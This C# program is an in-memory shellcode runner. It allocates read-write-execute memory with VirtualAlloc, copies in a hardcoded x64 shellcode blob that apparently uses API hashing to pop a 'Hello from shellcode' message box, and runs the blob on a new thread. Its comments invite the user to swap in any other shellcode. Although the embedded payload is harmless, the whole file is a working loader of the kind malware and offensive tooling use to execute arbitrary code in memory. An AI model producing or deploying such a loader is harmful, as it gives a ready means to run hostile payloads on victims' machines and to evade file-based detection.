using System;
using System.Runtime.InteropServices;
using System.Threading;

class InMemMsgBox
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
                                      IntPtr lpStartAddress, IntPtr lpParameter,
                                      uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);

    // Constants
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint INFINITE = 0xFFFFFFFF;

    static void Main()
    {
        Console.WriteLine("Testing managed MessageBox first...");
        MessageBox(IntPtr.Zero, "This is from managed code", "Test", 0);

        Console.WriteLine("Now loading shellcode...");

        // Your shellcode - replace this with your actual shellcode bytes
        byte[] shellcode = new byte[] {
            // Paste your shellcode bytes here
            0xFC, 0x48, 0x81, 0xE4, 0xF0, 0xFF, 0xFF, 0xFF, 0xE8, 0xCC, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x48, 0x8B, 0x52, 0x20, 0x41, 0x51, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x66, 0x81, 0x78, 0x18, 0x0B, 0x02, 0x0F, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x44, 0x8B, 0x40, 0x20, 0x8B, 0x48, 0x18, 0x49, 0x01, 0xD0, 0x50, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x4D, 0x31, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x41, 0x58, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x4B, 0xFF, 0xFF, 0xFF, 0x5D, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x59, 0x41, 0xBA, 0x4C, 0x77, 0x26, 0x07, 0xFF, 0xD5, 0x49, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x15, 0x00, 0x00, 0x00, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x66, 0x72, 0x6F, 0x6D, 0x20, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F, 0x64, 0x65, 0x00, 0x5A, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x00, 0x41, 0x58, 0x48, 0x31, 0xC9, 0x41, 0xBA, 0x45, 0x83, 0x56, 0x07, 0xFF, 0xD5, 0x48, 0x31, 0xC9, 0x41, 0xBA, 0xF0, 0xB5, 0xA2, 0x56, 0xFF, 0xD5
        };

        try
        {
            // Step 1: Allocate memory
            Console.WriteLine($"Allocating {shellcode.Length} bytes of memory...");
            IntPtr execMem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            
            if (execMem == IntPtr.Zero)
            {
                Console.WriteLine("Failed to allocate memory!");
                return;
            }
            Console.WriteLine($"Memory allocated at: 0x{execMem.ToInt64():X}");

            // Step 2: Copy shellcode to allocated memory
            Console.WriteLine("Copying shellcode to memory...");
            Marshal.Copy(shellcode, 0, execMem, shellcode.Length);

            // Step 3: Create and start thread
            Console.WriteLine("Creating thread to execute shellcode...");
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, execMem, IntPtr.Zero, 0, out uint threadId);
            
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("Failed to create thread!");
                return;
            }
            Console.WriteLine($"Thread created with ID: {threadId}");

            // Step 4: Wait for thread to complete (or timeout after 10 seconds)
            Console.WriteLine("Waiting for shellcode to execute...");
            uint result = WaitForSingleObject(hThread, 10000); // 10 second timeout
            
            if (result == 0) // WAIT_OBJECT_0
            {
                Console.WriteLine("Shellcode executed successfully!");
            }
            else
            {
                Console.WriteLine("Shellcode execution timed out or failed.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }

        Console.WriteLine("Press any key to exit...");
        Console.ReadKey();
    }
}